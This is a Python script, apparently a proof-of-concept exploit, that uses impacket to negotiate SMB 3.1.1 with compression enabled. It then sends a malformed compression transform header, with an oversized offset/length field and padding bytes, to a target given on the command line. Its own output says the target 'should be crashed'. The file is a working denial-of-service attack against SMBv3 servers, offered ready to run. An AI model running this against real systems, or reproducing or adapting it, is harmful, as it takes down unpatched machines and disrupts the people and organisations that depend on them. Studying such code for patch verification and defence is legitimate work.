#!/usr/bin/env python
import argparse
import string
import sys

from impacket import nmb
from impacket.smb3 import SMB2_COMPRESSION_TRANSFORM_HEADER, SMB3, SMB2_DIALECT_311, SMB2_NEGOTIATE_SIGNING_REQUIRED, \
    SMB2_NEGOTIATE_SIGNING_ENABLED, STATUS_SUCCESS, SMB2_DIALECT_30, \
    SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCARD, SMB2Negotiate_Response, SMB2_NEGOTIATE, \
    SMB2Negotiate, SMB311ContextData, SMB2NegotiateContext, SMB2_PREAUTH_INTEGRITY_CAPABILITIES, \
    SMB2PreAuthIntegrityCapabilities, \
    SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_GLOBAL_CAP_LEASING, SMB2_GLOBAL_CAP_LARGE_MTU, SMB3Packet, \
    SMB2_GLOBAL_CAP_DIRECTORY_LEASING, \
    SMB2_GLOBAL_CAP_MULTI_CHANNEL, SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, rand, SMB2_COMPRESSION_CAPABILITIES, \
    SMB2CompressionCapabilities


class MySMB3(SMB3):
    def __init__(self, remote_name, remote_host, my_name=None, host_type=nmb.TYPE_SERVER, sess_port=445, timeout=60,
                 UDP=0, preferredDialect=None, session=None, negSessionResponse=None):
        SMB3.__init__(self,remote_name, remote_host, my_name, host_type, sess_port, timeout, UDP, SMB2_DIALECT_311,
                      session, negSessionResponse)

    def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
        # Let's store some data for later use
        self._Connection['ClientSecurityMode'] = SMB2_NEGOTIATE_SIGNING_ENABLED
        if self.RequireMessageSigning is True:
            self._Connection['ClientSecurityMode'] |= SMB2_NEGOTIATE_SIGNING_REQUIRED
        self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
        currentDialect = SMB2_DIALECT_WILDCARD

        # Do we have a negSessionPacket already?
        if negSessionResponse is not None:
            # Yes, let's store the dialect answered back
            negResp = SMB2Negotiate_Response(negSessionResponse['Data'])
            currentDialect = negResp['DialectRevision']

        if currentDialect == SMB2_DIALECT_WILDCARD:
            # Still don't know the chosen dialect, let's send our options

            packet = self.SMB_PACKET()
            packet['Command'] = SMB2_NEGOTIATE
            negSession = SMB2Negotiate()

            negSession['SecurityMode'] = self._Connection['ClientSecurityMode']
            negSession['Capabilities'] = self._Connection['Capabilities']
            negSession['ClientGuid'] = self.ClientGuid
            if preferredDialect is not None:
                negSession['Dialects'] = [preferredDialect]
                if preferredDialect == SMB2_DIALECT_311:
                    # Build the Contexts
                    contextData = SMB311ContextData()
                    contextData['NegotiateContextOffset'] = 64+38+2
                    contextData['NegotiateContextCount'] = 0
                    # Add an SMB2_NEGOTIATE_CONTEXT with ContextType as SMB2_PREAUTH_INTEGRITY_CAPABILITIES
                    # to the negotiate request as specified in section 2.2.3.1:
                    negotiateContext = SMB2NegotiateContext()
                    negotiateContext['ContextType'] = SMB2_PREAUTH_INTEGRITY_CAPABILITIES

                    preAuthIntegrityCapabilities = SMB2PreAuthIntegrityCapabilities()
                    preAuthIntegrityCapabilities['HashAlgorithmCount'] = 1
                    preAuthIntegrityCapabilities['SaltLength'] = 32
                    preAuthIntegrityCapabilities['HashAlgorithms'] = b'\x01\x00'
                    preAuthIntegrityCapabilities['Salt'] = ''.join([rand.choice(string.ascii_letters) for _ in
                                                                     range(preAuthIntegrityCapabilities['SaltLength'])])

                    negotiateContext['Data'] = preAuthIntegrityCapabilities.getData()
                    negotiateContext['DataLength'] = len(negotiateContext['Data'])
                    contextData['NegotiateContextCount'] += 1
                    pad = b'\xFF' * (8 - (negotiateContext['DataLength'] % 8))

                    negotiateContext2 = SMB2NegotiateContext ()
                    negotiateContext2['ContextType'] = SMB2_COMPRESSION_CAPABILITIES

                    compressionCapabilities = SMB2CompressionCapabilities()
                    compressionCapabilities['CompressionAlgorithmCount'] = 1
                    compressionCapabilities['Padding'] = 0
                    compressionCapabilities['Flags'] = 0
                    compressionCapabilities['CompressionAlgorithms'] = b'\x01\x00'

                    negotiateContext2['Data'] = compressionCapabilities.getData()
                    negotiateContext2['DataLength'] = len(negotiateContext2['Data'])
                    contextData['NegotiateContextCount'] += 1

                    negSession['ClientStartTime'] = contextData.getData()
                    negSession['Padding'] = b'\xFF\xFF'
                    # Subsequent negotiate contexts MUST appear at the first 8-byte aligned offset following the
                    # previous negotiate context.
                    negSession['NegotiateContextList'] = negotiateContext.getData() + pad + negotiateContext2.getData()

            else:
                negSession['Dialects'] = [SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30]
            negSession['DialectCount'] = len(negSession['Dialects'])
            packet['Data'] = negSession

            packetID = self.sendSMB(packet)
            ans = self.recvSMB(packetID)
            if ans.isValidAnswer(STATUS_SUCCESS):
                negResp = SMB2Negotiate_Response(ans['Data'])

        self._Connection['MaxTransactSize']   = min(0x100000,negResp['MaxTransactSize'])
        self._Connection['MaxReadSize']       = min(0x100000,negResp['MaxReadSize'])
        self._Connection['MaxWriteSize']      = min(0x100000,negResp['MaxWriteSize'])
        self._Connection['ServerGuid']        = negResp['ServerGuid']
        self._Connection['GSSNegotiateToken'] = negResp['Buffer']
        self._Connection['Dialect']           = negResp['DialectRevision']
        if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED or \
                self._Connection['Dialect'] == SMB2_DIALECT_311:
            self._Connection['RequireSigning'] = True
        if self._Connection['Dialect'] == SMB2_DIALECT_311:
            # Always Sign
            self._Connection['RequireSigning'] = True

        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
            self._Connection['SupportsFileLeasing'] = True
        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LARGE_MTU) == SMB2_GLOBAL_CAP_LARGE_MTU:
            self._Connection['SupportsMultiCredit'] = True

        if self._Connection['Dialect'] >= SMB2_DIALECT_30:
            # Switching to the right packet format
            self.SMB_PACKET = SMB3Packet
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_DIRECTORY_LEASING) == SMB2_GLOBAL_CAP_DIRECTORY_LEASING:
                self._Connection['SupportsDirectoryLeasing'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_MULTI_CHANNEL) == SMB2_GLOBAL_CAP_MULTI_CHANNEL:
                self._Connection['SupportsMultiChannel'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_PERSISTENT_HANDLES) == SMB2_GLOBAL_CAP_PERSISTENT_HANDLES:
                self._Connection['SupportsPersistentHandles'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_ENCRYPTION) == SMB2_GLOBAL_CAP_ENCRYPTION:
                self._Connection['SupportsEncryption'] = True

            self._Connection['ServerCapabilities'] = negResp['Capabilities']
            self._Connection['ServerSecurityMode'] = negResp['SecurityMode']

    def attack(self):
        compressedHeader = SMB2_COMPRESSION_TRANSFORM_HEADER ()
        compressedHeader['ProtocolID'] = 0x424D53FC
        compressedHeader['OriginalCompressedSegmentSize'] = 1024
        compressedHeader['CompressionAlgorithm'] = 1
        compressedHeader['Flags'] = 0xffff
        compressedHeader['Offset_Length'] = 0xffffffff

        self._NetBIOSSession.send_packet (compressedHeader.getData () + b"A" * 1024)

if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='<targetName or address>')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    print('Sending attack')
    sess = MySMB3(options.target, options.target)
    sess.attack()
    print('Done. Target should be crashed')


